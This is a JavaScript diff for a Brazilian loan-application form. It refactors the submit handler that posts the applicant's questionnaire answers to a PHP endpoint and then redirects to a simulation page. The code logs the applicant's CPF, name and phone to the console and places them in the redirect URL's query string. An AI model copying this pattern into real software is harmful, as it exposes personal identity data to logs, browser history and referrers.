@@ -879,171 +879,153 @@
       });
 
       // Botão Solicitar Liberação
-      btnSolicitar.addEventListener("click", function () {
-        console.clear(); // Limpar console para facilitar o diagnóstico
+btnSolicitar.addEventListener("click", function () {
+  console.clear(); // Limpar console para facilitar o diagnóstico
 
-        // Obter telefone do formulário
-        const telefoneFormatado = telefone.replace(/\D/g, "");
-        if (!telefoneFormatado || telefoneFormatado.length < 10) {
-          alert("Por favor, informe um telefone válido.");
-          return;
-        }
-
-        // Obter dados diretamente do localStorage
-        const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
-        if (!dadosUsuarioJSON) {
-          console.error("Dados do usuário não encontrados no localStorage");
-          alert(
-            "Dados do usuário não encontrados. Por favor, reinicie o processo."
-          );
-          window.location.href = "./index.html";
-          return;
-        }
-
-        try {
-          // Parse do JSON para objeto
-          const dadosUsuario = JSON.parse(dadosUsuarioJSON);
-          console.log("Dados do usuário objeto:", dadosUsuario);
-
-          if (!dadosUsuario.cpf || !dadosUsuario.nome) {
-            console.error(
-              "Dados de CPF ou nome não encontrados:",
-              dadosUsuario
-            );
-            alert("Dados incompletos. Por favor, reinicie o processo.");
-            window.location.href = "./index.html";
-            return;
-          }
-
-          // Formato limpo do CPF (apenas números)
-          const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
-          console.log("CPF (apenas números):", cpfLimpo);
-          console.log("Nome completo:", dadosUsuario.nome);
-          console.log("Telefone:", telefoneFormatado);
-
-          // Mapear valores das respostas para valores mais legíveis
-          const mapearValorEmprestimo = {
-            "500-1000": "R$500 - R$1.000",
-            "1001-3000": "R$1.001 - R$3.000",
-            "3001-5000": "R$3.001 - R$5.000",
-            acima5000: "Acima de R$5.000",
-          };
-
-          const mapearRendaFixa = {
-            "carteira-assinada": "Sim, carteira assinada",
-            autonomo: "Sim, autônomo",
-            "sem-renda": "Não tenho renda fixa",
-          };
-
-          const mapearSolicitouCredito = {
-            aprovado: "Sim, foi aprovado",
-            negado: "Sim, foi negado",
-            nao: "Não",
-          };
-
-          const mapearFinalidadeCredito = {
-            "pagar-contas": "Pagar contas",
-            "investir-negocio": "Investir no próprio negócio",
-            "comprar-algo": "Comprar algo importante",
-            "uso-pessoal": "Uso pessoal",
-          };
-
-          // Preparar dados para enviar ao servidor
-          const dadosParaSalvar = {
-            nome: dadosUsuario.nome,
-            cpf: cpfLimpo,
-            telefone: telefoneFormatado,
-            valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
-            renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
-            negativado:
-              userAnswers["3"] === "sim"
-                ? "Sim"
-                : userAnswers["3"] === "nao"
-                  ? "Não"
-                  : "Não sei",
-            solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
-            dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
-            finalidade_credito:
-              mapearFinalidadeCredito[userAnswers["6"]] || "",
-            cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
-          };
-
-          console.log("Dados para salvar:", dadosParaSalvar);
-
-          // Enviar dados para o servidor
-          fetch("./salvar_dados.php", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(dadosParaSalvar),
-          })
-            .then((response) => response.json())
-            .then((data) => {
-              console.log("Resposta do servidor:", data);
-              if (data.status === "error") {
-                console.error("Erro ao salvar dados:", data.message);
-              }
-              // Continuar redirecionamento independentemente da resposta
-              // Obter todos os parâmetros da URL atual
-              const urlAtual = new URLSearchParams(window.location.search);
-
-              // Criar um novo objeto URLSearchParams para a nova URL
-              const novaUrl = new URLSearchParams();
-
-              // Adicionar todos os parâmetros atuais à nova URL
-              for (const [chave, valor] of urlAtual.entries()) {
-                novaUrl.append(chave, valor);
-              }
-
-              // Adicionar ou atualizar parâmetros específicos
-              novaUrl.set("cpf", cpfLimpo);
-              novaUrl.set("nome", dadosUsuario.nome);
-              novaUrl.set("numero", telefoneFormatado);
-
-              // Redirecionar para a página de simulação com todos os parâmetros
-              window.location.href = `./simulacao?${novaUrl.toString()}`;
-            })
-            .catch((error) => {
-              console.error("Erro na requisição:", error);
-              // Obter todos os parâmetros da URL atual
-const urlAtual = new URLSearchParams(window.location.search);
-
-// Criar um novo objeto URLSearchParams para a nova URL
-const novaUrl = new URLSearchParams();
-
-// Adicionar todos os parâmetros atuais à nova URL (exceto nome/numero, pra evitar lixo antigo)
-for (const [chave, valor] of urlAtual.entries()) {
-  if (chave !== "nome" && chave !== "numero") {
-    novaUrl.append(chave, valor);
+  // Obter telefone do formulário
+  const telefoneFormatado = telefone.replace(/\D/g, "");
+  if (!telefoneFormatado || telefoneFormatado.length < 10) {
+    alert("Por favor, informe um telefone válido.");
+    return;
   }
-}
 
-// Garantir CPF limpo
-novaUrl.set("cpf", cpfLimpo);
+  // Obter dados diretamente do localStorage
+  const dadosUsuarioJSON = localStorage.getItem("dadosUsuario");
+  if (!dadosUsuarioJSON) {
+    console.error("Dados do usuário não encontrados no localStorage");
+    alert("Dados do usuário não encontrados. Por favor, reinicie o processo.");
+    window.location.href = "./index.html";
+    return;
+  }
 
-// Serializar a parte "normal" da query (sem nome/numero)
-let queryBase = novaUrl.toString();
+  try {
+    // Parse do JSON para objeto
+    const dadosUsuario = JSON.parse(dadosUsuarioJSON);
+    console.log("Dados do usuário objeto:", dadosUsuario);
 
-// 🔹 Codificar nome e telefone manualmente, sem gerar "+"
-const nomeEncoded = encodeURIComponent(dadosUsuario.nome);
-const numeroEncoded = encodeURIComponent(telefoneFormatado);
+    if (!dadosUsuario.cpf || !dadosUsuario.nome) {
+      console.error("Dados de CPF ou nome não encontrados:", dadosUsuario);
+      alert("Dados incompletos. Por favor, reinicie o processo.");
+      window.location.href = "./index.html";
+      return;
+    }
 
-// Montar query final mantendo TODOS os parâmetros + nome/numero codificados
-let queryFinal = queryBase
-  ? `${queryBase}&nome=${nomeEncoded}&numero=${numeroEncoded}`
-  : `nome=${nomeEncoded}&numero=${numeroEncoded}`;
+    // 🔹 NORMALIZAR NOME AQUI (remove + e espaços extras)
+    dadosUsuario.nome = dadosUsuario.nome.replace(/\+/g, " ").trim();
 
-// Redirecionar para a página de simulação
-window.location.href = `./simulacao?${queryFinal}`;
+    // Formato limpo do CPF (apenas números)
+    const cpfLimpo = dadosUsuario.cpf.replace(/\D/g, "");
+    console.log("CPF (apenas números):", cpfLimpo);
+    console.log("Nome completo normalizado:", dadosUsuario.nome);
+    console.log("Telefone:", telefoneFormatado);
 
-            });
-        } catch (error) {
-          console.error("Erro ao processar dados:", error);
-          alert("Erro ao processar dados. Por favor, reinicie o processo.");
-          window.location.href = "./index.html";
+    // Mapear valores das respostas para valores mais legíveis
+    const mapearValorEmprestimo = {
+      "500-1000": "R$500 - R$1.000",
+      "1001-3000": "R$1.001 - R$3.000",
+      "3001-5000": "R$3.001 - R$5.000",
+      acima5000: "Acima de R$5.000",
+    };
+
+    const mapearRendaFixa = {
+      "carteira-assinada": "Sim, carteira assinada",
+      autonomo: "Sim, autônomo",
+      "sem-renda": "Não tenho renda fixa",
+    };
+
+    const mapearSolicitouCredito = {
+      aprovado: "Sim, foi aprovado",
+      negado: "Sim, foi negado",
+      nao: "Não",
+    };
+
+    const mapearFinalidadeCredito = {
+      "pagar-contas": "Pagar contas",
+      "investir-negocio": "Investir no próprio negócio",
+      "comprar-algo": "Comprar algo importante",
+      "uso-pessoal": "Uso pessoal",
+    };
+
+    // Preparar dados para enviar ao servidor
+    const dadosParaSalvar = {
+      nome: dadosUsuario.nome,
+      cpf: cpfLimpo,
+      telefone: telefoneFormatado,
+      valor_emprestimo: mapearValorEmprestimo[userAnswers["1"]] || "",
+      renda_fixa: mapearRendaFixa[userAnswers["2"]] || "",
+      negativado:
+        userAnswers["3"] === "sim"
+          ? "Sim"
+          : userAnswers["3"] === "nao"
+          ? "Não"
+          : "Não sei",
+      solicitou_credito: mapearSolicitouCredito[userAnswers["4"]] || "",
+      dia_vencimento: userAnswers["5"] ? "Dia " + userAnswers["5"] : "",
+      finalidade_credito: mapearFinalidadeCredito[userAnswers["6"]] || "",
+      cartao_credito: userAnswers["7"] === "sim" ? "Sim" : "Não",
+    };
+
+    console.log("Dados para salvar:", dadosParaSalvar);
+
+    // Função auxiliar para montar a URL de redirecionamento SEM colocar + no nome
+    function redirecionarSimulacao(cpfLimpo, nomeLimpo, telefoneLimpo) {
+      // Pega todos os parâmetros atuais
+      const urlAtual = new URLSearchParams(window.location.search);
+      const novaUrl = new URLSearchParams();
+
+      // Copia tudo, menos nome/numero antigos
+      for (const [chave, valor] of urlAtual.entries()) {
+        if (chave !== "nome" && chave !== "numero") {
+          novaUrl.append(chave, valor);
         }
+      }
+
+      // Garante CPF limpo
+      novaUrl.set("cpf", cpfLimpo);
+
+      // Query base (sem nome/numero)
+      const queryBase = novaUrl.toString();
+
+      // Codifica nome e telefone de forma segura
+      const nomeEncoded = encodeURIComponent(nomeLimpo);
+      const numeroEncoded = encodeURIComponent(telefoneLimpo);
+
+      const queryFinal = queryBase
+        ? `${queryBase}&nome=${nomeEncoded}&numero=${numeroEncoded}`
+        : `nome=${nomeEncoded}&numero=${numeroEncoded}`;
+
+      window.location.href = `./simulacao?${queryFinal}`;
+    }
+
+    // Enviar dados para o servidor
+    fetch("./salvar_dados.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(dadosParaSalvar),
+    })
+      .then((response) => response.json())
+      .then((data) => {
+        console.log("Resposta do servidor:", data);
+        if (data.status === "error") {
+          console.error("Erro ao salvar dados:", data.message);
+        }
+        // Redireciona mesmo assim
+        redirecionarSimulacao(cpfLimpo, dadosUsuario.nome, telefoneFormatado);
+      })
+      .catch((error) => {
+        console.error("Erro na requisição:", error);
+        // Em caso de erro, também redireciona
+        redirecionarSimulacao(cpfLimpo, dadosUsuario.nome, telefoneFormatado);
       });
+  } catch (error) {
+    console.error("Erro ao processar dados:", error);
+    alert("Erro ao processar dados. Por favor, reinicie o processo.");
+    window.location.href = "./index.html";
+  }
+});
+
 
       // Botão Voltar
       btnVoltar.addEventListener("click", function () {
